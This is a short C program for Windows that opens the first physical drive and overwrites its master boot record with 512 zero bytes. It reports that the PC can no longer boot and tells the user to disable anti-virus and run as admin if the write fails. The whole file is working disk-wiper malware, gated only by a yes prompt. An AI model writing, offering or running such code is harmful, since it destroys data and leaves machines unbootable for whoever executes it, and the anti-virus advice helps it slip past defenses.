#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <Windows.h>

int main(){ 
    int response;  
    DWORD bytesWritten;
    char trashData[512]; 
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    printf("Are you sure you want to overwrite your MBR (1 = Yes): ");

    scanf("%d", &response);

    if(response == 1){
        if(MasterBootRecord == INVALID_HANDLE_VALUE){
            printf("Invalid handle? Your disk might be gpt, or you haven't ran as admin."); 
            CloseHandle(MasterBootRecord);
            Sleep(3000); 
            exit(0); 
        }
        else{
            ZeroMemory(trashData, 512); 
           
            if(WriteFile(MasterBootRecord,trashData,512,&bytesWritten,NULL) == TRUE){
                switch (bytesWritten){
                    case 512:
                        printf("MBR successfully overwritten, this pc can no longer boot."); 
                        Sleep(5000);
                    exit(0);
                     

                    case 0: 
                        printf("MBR was NOT overwritten, try disabling anti-virus and run as ADMIN.");
                        Sleep(5000);
                    exit(0);
                    

                    default: 
                        printf("The MBR was probably corrupted, %lu bytes we're written to the MBR.", bytesWritten);
                        Sleep(5000);
                    exit(0);
                }
             }
        }
    }
    else{
        
        printf("Exiting...");
        CloseHandle(MasterBootRecord); 
        Sleep(3000); 
        exit(0); 
    }
}
